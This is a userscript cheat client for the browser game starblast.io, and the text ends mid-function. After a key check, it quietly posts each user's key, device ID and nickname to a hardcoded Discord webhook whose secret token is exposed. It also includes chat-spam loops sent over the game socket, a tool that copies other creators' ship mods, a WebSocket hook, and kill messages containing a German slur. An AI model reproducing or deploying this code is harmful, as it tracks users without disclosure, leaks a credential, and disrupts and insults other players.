// ==UserScript==
// @name         Chibi Client
// @version      1.7.1
// @description  Chibi Client <3
// @author       NND
// @match        https://starblast.io/
// @grant        none
// @namespace https://greasyfork.org/users/1296544
// @downloadURL https://update.greasyfork.org/scripts/562894/Chibi%20Client.user.js
// @updateURL https://update.greasyfork.org/scripts/562894/Chibi%20Client.meta.js
// ==/UserScript==
console.log("%c[UI] Chibi Client Color Patch – Datei geladen", "color:#00bcd4;font-weight:bold");
// Robust global strafe toggle (works if Client.simulator isn't available)
window.toggleStrafe = function() {
    try {
        // Find the settings entry that has .mode (same discovery you used in console)
        const entry = Object.values(window.module.exports.settings).find(e => e && e.mode);
        if (!entry || !entry.mode) {
            console.log("%c[Client]%c Could not find mode entry in window.module.exports.settings", "color:#c4bf9f", "color:#ff0000");
            return;
        }
 
        // Get mode values as array and locate index 8 (your console showed the strafe there)
        const modeArr = Object.values(entry.mode);
        const settingObj = modeArr[8];
 
        if (!settingObj || typeof settingObj.strafe === "undefined") {
            console.log("%c[Client]%c Could not find 'strafe' in mode[8].", "color:#c4bf9f", "color:#ff0000");
            return;
        }
 
        // Toggle 0 <-> 1
        settingObj.strafe = settingObj.strafe === 1 ? 0 : 1;
        const newState = settingObj.strafe === 1 ? "ENABLED" : "DISABLED";
        console.log(`%c[Client]%c Strafe ${newState} (strafe = ${settingObj.strafe})`, "color:#c4bf9f", "color:#00ff00");
 
        // Update button text if present
        const btn = document.getElementById("strafe-btn");
        if (btn) {
            btn.textContent = `Strafe: ${newState}`;
            // optional visual color change:
            btn.style.background = settingObj.strafe === 1 ? "linear-gradient(90deg, #007a00, #00b000)" : "radial-gradient(ellipse at center,hsla(200,50%,0%,1) 0,hsla(200,100%,80%,.5) 150%)";
        }
    } catch (err) {
        console.error("%c[Client]%c Error toggling strafe:", "color:#c4bf9f", "color:#ff0000", err);
    }
};
// === Chibi Client Access System (Persistent Key + Device, Multi-Tab) ===
(async () => {
  const KEYS_URL = "https://raw.githubusercontent.com/NNDsb/Test/main/keys.json";
  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1458484408196665394/cslR1H_EzGYQC5UHk2-Xeztdp5OVT96RdRCzuZ87icEzSqdlk4zqQZ7wrAwtJybXb11p";
 
  // --- Local Storage Manager ---
  const LocalManager = (() => {
    const DEVICE_KEY = "ChibiDeviceId";
    const KEY_AUTH = "ChibiKeyAuth";
 
    function getDeviceId() {
      let id = localStorage.getItem(DEVICE_KEY);
      if (!id) {
        id = crypto.randomUUID();
        localStorage.setItem(DEVICE_KEY, id);
        console.log("🟢 Neue Device-ID erstellt:", id);
      } else {
        console.log("🔵 Bestehende Device-ID:", id);
      }
      return id;
    }
 
    function getKey() {
      const stored = JSON.parse(localStorage.getItem(KEY_AUTH) || "{}");
      return stored.key || null;
    }
 
    function setKey(key) {
      const deviceId = getDeviceId();
      localStorage.setItem(KEY_AUTH, JSON.stringify({ key, device: deviceId }));
      console.log("🟢 Key gespeichert:", key);
    }
 
    function clearAll() {
      localStorage.removeItem(DEVICE_KEY);
      localStorage.removeItem(KEY_AUTH);
      console.log("⚠️ Local Storage geleert");
    }
 
    // Multi-Tab Sync
    if ('BroadcastChannel' in window) {
      const channel = new BroadcastChannel('chibi_device_channel');
      const deviceId = getDeviceId();
      channel.postMessage({ deviceId, key: getKey() });
      channel.onmessage = (e) => {
        if (e.data.deviceId && e.data.deviceId !== getDeviceId()) {
          localStorage.setItem(DEVICE_KEY, e.data.deviceId);
        }
        if (e.data.key && e.data.key !== getKey()) {
          localStorage.setItem(KEY_AUTH, JSON.stringify({ key: e.data.key, device: getDeviceId() }));
        }
      };
    }
 
    return { getDeviceId, getKey, setKey, clearAll };
  })();
 
  // --- Device-ID direkt abrufen (vor dem Blockscreen) ---
  const deviceId = LocalManager.getDeviceId();
 
  // --- Minimaler Blockscreen ---
  function createBlockScreen() {
    const blockScreen = document.createElement("div");
    Object.assign(blockScreen.style, {
      position: "fixed",
      top: "20px",
      left: "50%",
      transform: "translateX(-50%)",
      width: "300px",
      padding: "20px",
      background: "rgba(0,0,0,0.8)",
      color: "white",
      textAlign: "center",
      fontSize: "1.5rem",
      borderRadius: "8px",
      zIndex: "999999",
      pointerEvents: "none"
    });
    blockScreen.id = "chibi-blockscreen";
    blockScreen.innerText = "🔐 Zugriff gesperrt…";
 
    if (document.body) document.body.appendChild(blockScreen);
    else window.addEventListener("DOMContentLoaded", () => document.body.appendChild(blockScreen));
 
    return blockScreen;
  }
 
  const blockScreen = createBlockScreen();
 
  // --- Keys von GitHub laden ---
  async function fetchKeys() {
    try {
      const res = await fetch(KEYS_URL + "?t=" + Date.now());
      if (!res.ok) throw new Error("HTTP " + res.status);
      return await res.json();
    } catch (err) {
      blockScreen.innerHTML = "<h1 style='color:red;text-align:center;'>Fehler beim Laden der Key-Datei!</h1>";
      throw err;
    }
  }
 
  const keysData = await fetchKeys();
 
  // --- Key validieren ---
  function isKeyValid(inputKey) {
    if (!inputKey) return false;
    const k = inputKey.trim().toLowerCase();
    const matched = keysData.keys.find(kd => kd.key.toLowerCase() === k);
    if (!matched) return false;
    if (keysData.used.map(x => x.toLowerCase()).includes(k)) return false;
    const dev = LocalManager.getDeviceId();
    return matched.device.toLowerCase() === dev.toLowerCase();
  }
 
  // --- Key Prompt / Persistentes Login ---
  let currentKey = LocalManager.getKey();
  let firstTimeUse = false;
 
  async function ensureKey() {
    // Prüfen, ob bereits ein Key gespeichert ist
    if (currentKey && isKeyValid(currentKey)) {
      console.log("✅ Bereits gespeicherter Key gültig – Zugriff erlaubt");
      console.log("🔑 Device-ID aus Local Storage:", LocalManager.getDeviceId());
      return true;
    }
 
    // Prompt anzeigen, bis gültiger Key eingegeben wird
    while (true) {
      const input = prompt("🔐 Bitte gib deinen Key ein:");
 
      const savedDeviceId = LocalManager.getDeviceId();
 
      // Leere Eingabe oder Abbrechen
      if (!input || input.trim() === "") {
        blockScreen.innerText = "❌ Kein Key eingegeben – bitte versuche es erneut!";
        console.log("⚠️ Kein Key eingegeben. Device-ID im Local Storage:", savedDeviceId);
        continue;
      }
 
      const candidate = input.trim();
 
      if (isKeyValid(candidate)) {
        const hadKeyBefore = !!LocalManager.getKey();
        LocalManager.setKey(candidate);
        currentKey = candidate;
        firstTimeUse = !hadKeyBefore;
        console.log("✅ Gültiger Key eingegeben. Device-ID im Local Storage:", savedDeviceId);
        return true;
      } else {
        blockScreen.innerText = "❌ Ungültiger Key – bitte erneut versuchen!";
        console.log("⚠️ Falscher Key eingegeben. Device-ID im Local Storage:", savedDeviceId);
        continue;
      }
    }
  }
 
  await ensureKey();
 
  // --- Discord-Webhook ---
  const lastNickname = localStorage.getItem("lastNickname") || "Nicht gesetzt";
  fetch(DISCORD_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: "Chibi Client Access",
      embeds: [{
        title: firstTimeUse ? "🔓 Neuer Zugriff" : "🔄 Wiederholter Zugriff",
        color: firstTimeUse ? 0x00ff99 : 0xffff00,
        fields: [
          { name: "Key", value: currentKey },
          { name: "Device", value: deviceId },
          { name: "Nickname", value: lastNickname },
          { name: "Zeit", value: new Date().toLocaleString() }
        ]
      }]
    })
  });
 
  // --- Blockscreen entfernen ---
  blockScreen.remove();
 
})();
// WEBGL FIX - Add this at the VERY beginning
(function() {
    'use strict';
    // Force hardware WebGL acceleration
    const originalGetContext = HTMLCanvasElement.prototype.getContext;
    HTMLCanvasElement.prototype.getContext = function(type, attributes) {
        if (type === 'webgl' || type === 'webgl2') {
            attributes = attributes || {};
            attributes.failIfMajorPerformanceCaveat = false;
            attributes.powerPreference = 'high-performance';
            console.log('%c[Performance] WebGL hardware acceleration forced', 'color: #00ff00');
        }
        return originalGetContext.call(this, type, attributes);
    };
})();
/*
#c4bf9f
#d9ff00
#6897BB
*/
// WEBGL FIX - Add this at the VERY beginning
//custom client settings i set here to a default when they are not set yet.
if (localStorage.getItem('blorus') == null) localStorage.setItem('blorus', 'false');
if (localStorage.getItem('selftag') == null) localStorage.setItem('selftag', 'true');
if (localStorage.getItem('wrdlogo') === null) localStorage.setItem('wrdlogo', 'false');
if (localStorage.getItem('gemindeed') === null) localStorage.setItem('gemindeed', '"#ff0000"');
if (localStorage.getItem('gemindeed1') === null) localStorage.setItem('gemindeed1', '"#ff8080"');
if (localStorage.getItem('emopacity') === null) localStorage.setItem('gemindeed1', '"4"');
if (localStorage.getItem('shpcolorr') === null) localStorage.setItem('shpcolorr', '"#9BAACF"');
console.clear();
let Client = new (class {
    log(msg) {
        console.log(`%c[Client] ${msg}`, 'color: #c4bf9f');
    }
    error(msg) {
        console.log(`%c[Client]%c[Error] ${msg}`, 'color: #ff0000');
    }
    checkgame() {
        return '/' == window.location.pathname && 'welcome' != Object.values(window.module.exports.settings).find(e => e && e.mode).mode.id && 'https://starblast.io/#' != window.location.href;
    }
    simulator = new (class {
        onlog(name) {
            console.log(`%c[Client]%c[Simulator] ${name} Simulator enabled`, 'color: #c4bf9f', 'color: #00ff00');
        }
        offlog(name) {
            console.log(`%c[Client]%c[Simulator] ${name} Simulator disabled`, 'color: #c4bf9f', 'color: #ffff00');
        }
        errlog() {
            console.log(`%c[Client]%c[Simulator Error] Game is not Running`, 'color: #c4bf9f', 'color: #ff0000');
        }
    // Troller Simulator (OGOYO-Spam)
    troller() {
        if (window.troller == true) {
            window.troller = false;
            this.offlog("Troller");
        } else if (Client.checkgame()) {
            window.troller = true;
            if (Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.shield &&
                0 != Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.generator) {
                var number = 0;
                var objval = Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.socket).socket;
                this.onlog("Troller");
 
                function onnoff() {
                    function sayemote(msg) {
                        var saythng = { name: "say", data: msg };
                        objval.send(JSON.stringify(saythng));
                    }
                    var onofffunc = false;
                    if (onofffunc == false && number == 0) {
                        number = 1; sayemote("EGJNG"); onofffunc = true;
                    }
                    if (onofffunc == false && number == 1) {
                        sayemote("GEGJN"); number = 2; onofffunc = true;
                    }
                    if (onofffunc == false && number == 2) {
                        sayemote("NGEGJ"); number = 3; onofffunc = true;
                    }
                    if (onofffunc == false && number == 3) {
                        sayemote("JNGEG"); number = 4; onofffunc = true;
                    }
                    if (onofffunc == false && number == 4) {
                        sayemote("GJNGE"); number = 0; onofffunc = true;
                    }
                    if (window.troller == true) {
                        setTimeout(onnoff, 600);
                    }
                }
                onnoff();
            }
        }
        else { this.errlog() }
    }
 
    // X Spam Simulator
    xspam() {
        if (window.xspam == true) {
            window.xspam = false;
            this.offlog("X Spam");
        } else if (Client.checkgame()) {
            window.xspam = true;
            if (Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.shield &&
                0 != Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.generator) {
                var number = 0;
                var objval = Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.socket).socket;
                this.onlog("X Spam");
 
                function onnoff() {
                    function sayemote(msg) {
                        var saythng = { name: "say", data: msg };
                        objval.send(JSON.stringify(saythng));
                    }
                    var onofffunc = false;
                    if (onofffunc == false) {
                        sayemote("X");
                        onofffunc = true;
                    }
                    if (window.xspam == true) {
                        setTimeout(onnoff, 600);
                    }
                }
                onnoff();
            }
        }
        else { this.errlog() }
    }
 
    // GG Spam Simulator
    gspam() {
        if (window.gspam == true) {
            window.gspam = false;
            this.offlog("G Spam");
        } else if (Client.checkgame()) {
            window.gspam = true;
            if (Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.shield &&
                0 != Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.generator) {
                var number = 1;
                var objval = Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.socket).socket;
                this.onlog("G Spam");
 
               function onnoff() {
                    function sayemote(msg) {
                        var saythng = { name: "say", data: msg };
                        objval.send(JSON.stringify(saythng));
                    }
                    var onofffunc = false;
                    if (onofffunc == false && number == 1) {
                        number = 2; sayemote("QQVQQ"); onofffunc = true;
                    }
                    if (onofffunc == false && number == 2) {
                        sayemote("QQQVQ"); number = 3; onofffunc = true;
                    }
                    if (onofffunc == false && number == 3) {
                        sayemote("QQQQV"); number = 4; onofffunc = true;
                    }
                    if (onofffunc == false && number == 4) {
                        sayemote("VQQQQ"); number = 0; onofffunc = true;
                    }
                    if (onofffunc == false && number == 0) {
                        sayemote("QVQQQ"); number = 1; onofffunc = true;
                    }
                    if (window.gspam == true) {
                        setTimeout(onnoff, 300);
                    }
                }
                onnoff();
            }
        }
        else { this.errlog() }
    }
 
 
    // Blank Spam Simulator
    blankspam() {
        if (window.blankspam == true) {
            window.blankspam = false;
            this.offlog("Blank Spam");
        } else if (Client.checkgame()) {
            window.blankspam = true;
            if (Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.shield &&
                0 != Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.generator) {
                var number = 0;
                var objval = Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.socket).socket;
                this.onlog("Blank Spam");
 
                function onnoff() {
                    function sayemote(msg) {
                        var saythng = { name: "say", data: msg };
                        objval.send(JSON.stringify(saythng));
                    }
                    var onofffunc = false;
                    if (onofffunc == false && number == 0) {
                        number = 1; sayemote("kkkkk"); onofffunc = true;
                    }
                    if (onofffunc == false && number == 1) {
                        sayemote("ggggg"); number = 2; onofffunc = true;
                    }
                    if (onofffunc == false && number == 2) {
                        sayemote("ggggg"); number = 3; onofffunc = true;
                    }
                    if (onofffunc == false && number == 3) {
                        sayemote("ggggg"); number = 4; onofffunc = true;
                    }
                    if (onofffunc == false && number == 4) {
                        sayemote("ggggg"); number = 0; onofffunc = true;
                    }
                    if (window.blankspam == true) {
                        setTimeout(onnoff, 1200);
                    }
                }
                onnoff();
            }
        }
        else { this.errlog() }
    }
 
    // Nerd Spam Simulator (L-Spam)
    nerdspam() {
        if (window.nerdspam == true) {
            window.nerdspam = false;
            this.offlog("Nerd Spam");
        } else if (Client.checkgame()) {
            window.nerdspam = true;
            if (Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.shield &&
                0 != Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.generator) {
                var number = 0;
                var objval = Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.socket).socket;
                this.onlog("Nerd Spam");
 
                function onnoff() {
                    function sayemote(msg) {
                        var saythng = { name: "say", data: msg };
                        objval.send(JSON.stringify(saythng));
                    }
                    var onofffunc = false;
                    if (onofffunc == false && number == 1) {
                        number = 2; sayemote("Kkkkk"); onofffunc = true;
                    }
                    if (onofffunc == false && number == 2) {
                        sayemote("KKkkk"); number = 3; onofffunc = true;
                    }
                    if (onofffunc == false && number == 3) {
                        sayemote("KKKkk"); number = 4; onofffunc = true;
                    }
                    if (onofffunc == false && number == 4) {
                        sayemote("KKKKk"); number = 0; onofffunc = true;
                    }
                    if (onofffunc == false && number == 0) {
                        sayemote("KKKKK"); number = 1; onofffunc = true;
                    }
                    if (window.nerdspam == true) {
                        setTimeout(onnoff, 300);
                    }
                }
                onnoff();
            }
        }
        else { this.errlog() }
    }
 
    // ENG Spam Simulator (Me No GG)
    engspam() {
        if (window.engspam == true) {
            window.engspam = false;
            this.offlog("Me No GG Spam");
        } else if (Client.checkgame()) {
            window.engspam = true;
            if (Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.shield &&
                0 != Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.generator) {
                var number = 0;
                var objval = Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.socket).socket;
                this.onlog("Me No GG Spam");
 
                function onnoff() {
                    function sayemote(msg) {
                        var saythng = { name: "say", data: msg };
                        objval.send(JSON.stringify(saythng));
                    }
                    var onofffunc = false;
                    if (onofffunc == false && number == 0) {
                        number = 1; sayemote("X"); onofffunc = true;
                    }
                    if (onofffunc == false && number == 1) {
                        sayemote("S"); number = 0; onofffunc = true;
                    }
                    if (window.engspam == true) {
                        setTimeout(onnoff, 300);
                    }
                }
                onnoff();
            }
        }
        else { this.errlog() }
    }
 
    // Custom Spam Simulator (qQ-Spam)
    custom() {
        if (window.custom == true) {
            window.custom = false;
            this.offlog("custom");
        } else if (Client.checkgame()) {
            window.custom = true;
            if (Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.shield &&
                0 != Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.status).status.generator) {
                var number = 0;
                var objval = Object.values(Object.values(window.module.exports.settings).find(e => e.mode)).find(e => e.socket).socket;
                this.onlog("custom");
 
                function onnoff() {
                    function sayemote(msg) {
                        var saythng = { name: "say", data: msg };
                        objval.send(JSON.stringify(saythng));
                    }
                    var onofffunc = false;
                    if (onofffunc == false) {
                        sayemote("qQ");
                        onofffunc = true;
                    }
                    if (window.custom == true) {
                        setTimeout(onnoff, 1000);
                    }
                }
                onnoff();
            }
        }
        else { this.errlog() }
    }
})();
    shipstealer = new (class {
        log(msg) {
            console.log(`%c[Client]%c[Ship-Stealer] ${msg}`, 'color: #c4bf9f', 'color: #d9ff00');
        }
        steal() {
            this.log('Retrieving mod');
            var e = Object.values(Object.values(window.module.exports.settings).find(e => e.mode).mode).find(e => e.ships).ships,
                t = window.open('');
            t.document.write("//Made with Troller's Client Ship Stealer (stolen from Subspace)<br><br>"),
                t.document.write('var ships = [];<br><br>'),
                (t.document.title = "Troller's Client Ship stealer");
            for (var n = 0; n != e.length; n++)
                if ('object' == typeof e[n]) {
                    e[n].model.length;
                    let i = e[n].name + '_' + e[n].level;
                    (i = (i = i + '0' + e[n].model).replace(/-/g, '_').replace(/ /g, '_')),
                        t.document.write('var ' + i + " = '" + JSON.stringify(e[n]) + "';"),
                        t.document.write('<br>'),
                        t.document.write('ships.push(' + i + ');'),
                        t.document.write('<br><br>');
                } else {
                    JSON.parse(e[n]).model.toString().length;
                    let o = JSON.parse(e[n]).name + '_' + JSON.parse(e[n]).level;
                    (o = (o = o + '0' + JSON.parse(e[n]).model).replace(/-/g, '_').replace(/ /g, '_')),
                        t.document.write(o + " = '" + e[n] + "'"),
                        t.document.write('<br>'),
                        t.document.write('ships.push(' + o + ');'),
                        t.document.write('<br><br>');
                }
            t.document.write('//just optional game options to test the ships in:'),
                t.document.write('<br>'),
                t.document.write(
                    'this.options = { map_size: 50, max_players: 70, reset_tree: true, ships:ships, asteroids_strength: 0.1, root_mode: "survival", starting_ship: 101, crystal_value: 2.5, }; this.tick = function(game) { };'
                ),
                t.document.close(),
                this.log('Done Retrieving mod');
        }
    })();
    killMessages = new (class {
        constructor() {
            this.emotes = [
                {text: "Ich", icon: "O", key: "E"},
                {text: "GG", icon: "GG", key: "G"},
                {text: "Du", icon: "N", key: "J"},
                {text: "Hurensohn", icon: "x", key: "V"},
                {text: "Bye", icon: "F", key: "B"}
            ];
        }
 
        getRandomEmote() {
            return this.emotes[Math.floor(Math.random() * this.emotes.length)];
        }
 
        sendKillMessage() {
            if (!Client.checkgame()) return;
 
            try {
                const chatPanel = Object.values(window).find(
                    obj => obj?.prototype?.addMessage?.toString().includes('chat_message')
                )?.prototype;
 
                if (chatPanel) {
                    const emote = this.getRandomEmote();
                    chatPanel.addMessage({
                        type: "chat_message",
                        player_name: "System",
                        text: `[${emote.icon}] ${emote.text}`,
                        hue: 0
                    });
                }
            } catch(e) {
                console.error("Kill message error:", e);
            }
        }
    })();
    players = new (class {
        info(msg) {
            console.log(msg);
        }
 
        error(msg) {
            console.log(`%c[Client]%c[Player-Logger Error] ${msg}`, 'color: #c4bf9f', 'color: #ffa600');
        }
 
        getHueColor(hue) {
            if (hue < 25) return 'Red';
            if (hue < 50) return 'Orange';
            if (hue < 75) return 'Yellow';
            if (hue < 150) return 'Green';
            if (hue < 256) return 'Blue';
            if (hue < 287) return 'Purple';
            if (hue < 331) return 'Pink';
            return 'Red';
        }
 
 
        log() {
            if (Client.checkgame()) {
                let options = {
                    badge: {
                        star: 'Star',
                        reddit: 'Reddit',
                        pirate: 'Pirate',
                        csf: 'Centauri Space Force',
                        pmf: 'Proxima Mining Front',
                        nwac: 'New World Army Citizens',
                        unge: 'United Nations Green Eagles',
                        halo: 'Halo Corsairs',
                        youtube: 'Youtube',
                        twitch: 'Twitch',
                        invader: 'Invader',
                        empire: 'Galactic Empire',
                        alliance: 'Rebel Alliance',
                        sdf: 'Soloist Defence Force',
                        paw: 'Paw',
                        gamepedia: 'Gamepedia',
                        discord: 'Discord',
                        medic: 'Medic',
                        blank: 'Blank',
                        seasonal: 'Seasonal',
                    },
                    finish: { zinc: 'Zinc', alloy: 'Alloy', gold: 'Gold', titanium: 'Titanium', carbon: 'Carbon' },
                    laser: { 0: 'Single', 1: 'Double', 2: 'Lightning', 3: 'Digital' },
                };
                let filter = Object.keys(window.module.exports.settings).filter(e => e.match(/[iI10OlL]{3,6}/))[0],
                    playerData = [],
                    players = window.module.exports.settings[filter].names.data
                .filter(e => void 0 !== e)
                .forEach(player => {
                    if (player.custom && (!(player.custom.badge in options.badge) || !(player.custom.finish in options.finish))){
                        playerData.push(
                            '!' +
                            player.hue +
                            '␆' +
                            this.getHueColor(player.hue) +
                            ' - ' +
                            player.player_name +
                            ' - ' +
                            (player.custom
                             ? player.custom.badge.charAt(0).toUpperCase() + player.custom.badge.slice(1) + ' - ' + player.custom.finish.charAt(0).toUpperCase() + player.custom.finish.slice(1)
                             : 'No ecp')
                        );
                    } else {
                        playerData.push(
                            player.hue +
                            '␆' +
                            this.getHueColor(player.hue) +
                            ' - ' +
                            player.player_name +
                            ' - ' +
                            (player.custom
                             ? player.custom.badge.charAt(0).toUpperCase() + player.custom.badge.slice(1) + ' - ' + player.custom.finish.charAt(0).toUpperCase() + player.custom.finish.slice(1)
                             : 'No ecp')
                        );
                    }
                    playerData.sort((a, b) => {
                        const hueA = parseInt(a.startsWith('!') ? a.slice(1).split('␆')[0] : a.split('␆')[0]);
                        const hueB = parseInt(b.startsWith('!') ? b.slice(1).split('␆')[0] : b.split('␆')[0]);
                        return hueA - hueB;
                    });
                });
                for (const player of playerData) {
                    if (player.startsWith('!')) {
                        console.log(`%c🎮 ${player.split('␆')[1]} %c⚠️ CLIENT DETECTED!`,
                                    `color: hsl(${player.replace(/^!/, '').split('␆')[0]},100%,80%); font-weight: bold; font-size: 14px; text-shadow: 0 0 5px currentColor; padding: 2px 8px; border-radius: 4px; background: rgba(255,255,255,0.1);`,
                                    `color: #ff0000; font-weight: bold; background: #330000; padding: 2px 6px; border: 2px solid #ff0000; border-radius: 4px; text-transform: uppercase; letter-spacing: 1px; animation: blink 1s infinite; text-shadow: 0 0 10px #ff0000;`);
                    } else {
                        console.log(`%c🎯 ${player.split('␆')[1]}`,
                                    `color: hsl(${player.replace(/^!/, '').split('␆')[0]},100%,80%); font-weight: bold; font-size: 14px; text-shadow: 0 0 5px currentColor; padding: 2px 8px; border-radius: 4px; background: rgba(255,255,255,0.1);`);
                    }
                }
            }
        }
    })();
})();
window.ClientStorage = new (class {
    gem1 = function () {
        try {
            return JSON.parse(localStorage.getItem('gemindeed'));
        } catch (_) {
            const fallback = '#ff0000';
            localStorage.setItem('gemindeed', JSON.stringify(fallback));
            return fallback;
        }
    };
    gem2 = function () {
        try {
            const data = localStorage.getItem('gemindeed1');
            return JSON.parse(data);
        } catch (_) {
            const fallback = '#ff8080';
            localStorage.setItem('gemindeed1', JSON.stringify(fallback));
            return fallback;
        }
    };
    emotes = function () {
        try {
            return JSON.parse(localStorage.getItem('emopacity'));
        } catch (_) {
            const fallback = '"4"';
            localStorage.setItem('emopacity', JSON.stringify(fallback));
            return fallback;
        }
    };
    spcolor = function () {
        try {
            return JSON.parse(localStorage.getItem('shpcolorr'));
        } catch (_) {
            const fallback = '#9BAACF';
            localStorage.setItem('shpcolorr', JSON.stringify(fallback));
            return fallback;
        }
    };
    scroll = new (class {
        bar() {
            document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td.ecpverifiedlogo.frozenbg').addEventListener('wheel', e => {
                e.deltaY < 1
                    ? document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(1) > i.fa.fa-caret-right').click()
                    : e.deltaY > 1 && document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(1) > i.fa.fa-caret-left').click();
                e.stopPropagation();
            });
            document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(1) > div').addEventListener('wheel', e => {
                e.deltaY < 1
                    ? document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(1) > i.fa.fa-caret-right').click()
                    : e.deltaY > 1 && document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(1) > i.fa.fa-caret-left').click();
                e.stopPropagation();
            });
            document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td.shippreview.frozenbg').addEventListener('wheel', e => {
                e.deltaY < 1
                    ? document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(2) > i.fa.fa-caret-right').click()
                    : e.deltaY > 1 && document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(2) > i.fa.fa-caret-left').click();
                e.stopPropagation();
            });
            document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(2) > div').addEventListener('wheel', e => {
                e.deltaY < 1
                    ? document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(2) > i.fa.fa-caret-right').click()
                    : e.deltaY > 1 && document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(2) > i.fa.fa-caret-left').click();
                e.stopPropagation();
            });
            document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(3) > div').addEventListener('wheel', e => {
                e.deltaY < 1
                    ? document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(3) > i.fa.fa-caret-right').click()
                    : e.deltaY > 1 && document.querySelector('body > div.modal > div.modalbody > div > table > tbody > tr > td:nth-child(2) > div:nth-child(3) > i.fa.fa-caret-left').click();
                e.stopPropagation();
            });
        }
    })();
})();
window.inspectDataView = function(dataView, littleEndian = true) {
    if (!(dataView instanceof DataView)) {
        console.error("Provided argument is not a DataView.");
        return;
    }
 
    let html = `
        <html>
        <head><title>DataView Inspector</title></head>
        <body style="font-family: monospace; white-space: pre;">
            <h2>DataView Contents</h2>
            <table border="1" cellpadding="5" cellspacing="0">
                <tr>
                    <th>Byte Offset</th>
                    <th>Uint8</th>
                    <th>Int8</th>
                    <th>Uint16</th>
                    <th>Int16</th>
                    <th>Uint32</th>
                    <th>Int32</th>
                    <th>Float32</th>
                </tr>
    `;
 
    for (let i = 0; i < dataView.byteLength; i++) {
        const uint8 = dataView.getUint8(i);
        const int8 = dataView.getInt8(i);
        let uint16 = i + 1 < dataView.byteLength ? dataView.getUint16(i, littleEndian) : '';
        let int16 = i + 1 < dataView.byteLength ? dataView.getInt16(i, littleEndian) : '';
        let uint32 = i + 3 < dataView.byteLength ? dataView.getUint32(i, littleEndian) : '';
        let int32 = i + 3 < dataView.byteLength ? dataView.getInt32(i, littleEndian) : '';
        let float32 = i + 3 < dataView.byteLength ? dataView.getFloat32(i, littleEndian).toFixed(6) : '';
 
        html += `
            <tr>
                <td>${i}</td>
                <td>${uint8}</td>
                <td>${int8}</td>
                <td>${uint16}</td>
                <td>${int16}</td>
                <td>${uint32}</td>
                <td>${int32}</td>
                <td>${float32}</td>
            </tr>
        `;
    }
 
    html += `
            </table>
        </body>
        </html>
    `;
 
    const blob = new Blob([html], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    window.open(url, '_blank');
};
async function ClientLoader() {
        // WebSocket Modifikation für Kill-Messages
    const originalSend = WebSocket.prototype.send;
    WebSocket.prototype.send = function(data) {
        try {
            if (typeof data === 'string' && data.includes('"name":"destroy"')) {
                setTimeout(() => Client.killMessages.sendKillMessage(), 500);
            }
        } catch(e) {
            console.error("WebSocket error:", e);
        }
        return originalSend.apply(this, arguments);
    };
    let fullstart = performance.now();
    ('use strict');
    document.open();
    document.write('');
    window.onbeforeunload = null;
    document.close();
    document.open();
    document.write(
